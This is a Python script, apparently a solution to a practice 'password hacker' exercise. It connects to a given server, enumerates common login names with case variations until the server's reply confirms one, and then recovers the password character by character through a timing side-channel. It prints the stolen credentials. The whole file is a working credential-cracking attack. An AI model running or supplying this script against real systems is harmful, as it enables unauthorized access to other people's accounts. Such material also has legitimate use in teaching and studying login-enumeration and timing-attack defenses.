import socket
import argparse
import itertools
import string
import os
import json
import time


def parse_arguments() -> argparse.Namespace:
    """ Create, parse and return the programs initial arguments. """

    parser = argparse.ArgumentParser(description="This program prints the login name and password for the site.")
    parser.add_argument("ip_address")
    parser.add_argument("port")
    return parser.parse_args()


def word_variations(word: str) -> str:
    """ Generate all the possible variations for a given word. Character can be lowercase or uppercase,
    but stay in the same order. """

    characters = []
    for character in word:
        if character in string.ascii_lowercase:
            characters.append([character, character.upper()])
        else:
            characters.append([character])
        for combination in itertools.product(*characters):
            variation = "".join(combination)
            yield variation


def words_starting_with(first_symbols: str) -> str:
    """ Generates all the words starting with a given string + an additional character. """

    possible_characters = string.ascii_letters + string.digits
    for combination in itertools.product([first_symbols], possible_characters):
        word = "".join(combination)
        yield word


def send_message_to_server(client: socket.socket, message: dict) -> dict:
    """ Returns the answer from a server after sending a given message. """

    json_string = json.dumps(message)
    client.send(json_string.encode())
    response = client.recv(1024)
    try:
        response = json.loads(response.decode())
    except json.decoder.JSONDecodeError:
        # print(message)
        pass
    return response


def try_passwords_by_exception(client: socket.socket, login_data: dict) -> dict:
    """ Return the server's password after hacking it. Requires a valid login name.
    Uses the fact, that the server takes more time to answer when there is an exception.
    An exception means, that the password is a prefix of the correct password. """

    first_symbols = ""
    while True:
        passwords = words_starting_with(first_symbols)
        for password in passwords:
            login_data["password"] = password
            start_time = time.perf_counter()
            response = send_message_to_server(client, login_data)["result"]
            end_time = time.perf_counter()
            total_time = end_time - start_time
            if response == "Connection success!":
                # print(f"Password found: {login_data['password']}")
                return login_data
            elif total_time >= 0.1:  # if the server takes more time to answer, an exception was found
                first_symbols = login_data["password"]
                # print(f"Password starts with {first_symbols}")
                break


def try_typical_logins(client: socket.socket, login_data: dict) -> dict:
    """ Return the server's login name after hacking it. """

    abs_path = os.path.abspath(__file__)
    path = os.path.join(abs_path, r"..\logins.txt")  # a list of often used login names
    with open(path, "r") as login_file:
        for line in login_file:
            login = line.strip().lower()
            logins = word_variations(login)
            for login in logins:
                login_data["login"] = login
                response = send_message_to_server(client, login_data)["result"]
                if response == "Wrong password!":  # if the server answers with "Wrong password!", the login was found
                    # print(f"Login found: {login_data['login']}")
                    return login_data
        return login_data


def hack_server(ip_address: str, port: int) -> None:
    """ A function that connects to a server with given ip_address and port.
    Prints the hacked login name and password in json format. """

    with socket.socket() as client:
        address = (ip_address, port)
        client.connect(address)

        login_data = {"login": "", "password": ""}
        login_data = try_typical_logins(client, login_data)  # guess the login name
        login_data = try_passwords_by_exception(client, login_data)  # guess the password

        print(json.dumps(login_data, indent=4))

        client.close()


def main():
    args = parse_arguments()
    hack_server(str(args.ip_address), int(args.port))


if __name__ == "__main__":
    main()
